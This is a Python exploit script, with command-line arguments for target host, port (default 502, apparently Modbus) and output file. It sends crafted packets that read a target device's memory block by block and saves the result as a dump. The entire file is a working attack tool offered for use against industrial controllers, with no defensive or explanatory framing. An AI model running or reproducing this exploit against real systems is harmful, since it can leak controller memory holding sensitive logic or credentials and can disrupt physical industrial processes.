#!/usr/bin/env python3

__author__ = "Yanis Wang"
__email__ = "mryaniswang@gmail.com"

import argparse
import socket


def exploit(host: str, port: int, output: str):
    print("[*] Connecting to target")

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))

    print("[+] Connection established")
    print("[*] Reading memory block, it may take a few minutes")

    block_data = b""

    for i in range(0x0000, 0xffff):
        block_number = i.to_bytes(2, "little")

        for j in range(0x00000000, 0x0000ffff, 0x00000200):
            print(f"[*] Reading block 0x{i:04x}, offset 0x{j:08x}", end="\r")

            offset = j.to_bytes(4, "little")
            data = b"\xff\xff\x00\x00\x00\x0d\x01\x5a\x00\x20\x00" + block_number + offset + b"\x00\x02"
            
            try:
                sock.send(data)
                response = sock.recv(1024)
            except (ConnectionError, TimeoutError):
                print("[-] Connection closed, possibly an unexpected vulnerability triggered")
                exit(-1)

            if response[9] == 0xfe:
                block_data += response[13:]
            else:
                break

    if block_data:
        with open(output, "wb") as f: 
            f.write(block_data)
    else:
        print("\033[K", end="\r")
        print("[-] Target not vulnerable")
        exit(-1)

    print("\033[K", end="\r")
    print("[+] Done")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", required=True, type=str, default=None, help="Target address")
    parser.add_argument("--port", required=False, type=int, default=502, help="Target port")
    parser.add_argument("--output", required=False, type=str, default="memory.dump", help="Output memory dump file")
    args = parser.parse_args()

    exploit(args.host, args.port, args.output)


if __name__ == "__main__":
    main()
